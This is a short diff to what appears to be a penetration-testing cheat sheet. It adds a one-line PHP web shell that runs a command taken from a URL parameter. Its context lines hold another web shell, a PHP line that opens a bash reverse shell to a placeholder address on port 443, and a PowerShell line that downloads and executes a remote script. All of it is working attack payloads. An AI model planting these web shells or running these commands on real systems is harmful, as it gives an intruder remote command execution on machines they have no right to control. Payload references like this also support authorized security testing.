@@ -1047,6 +1047,8 @@ PowerShell "IEX(New-Object Net.WebClient).downloadString('http://IP_ATTACK/rev.p
 ```php
 <?php SYSTEM($_REQUEST['cmd']); ?>
 # or
+<?php system($_GET["cmd"]);?>
+# or
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.xx.xx/443 0>&1'"); ?>
 ```
 
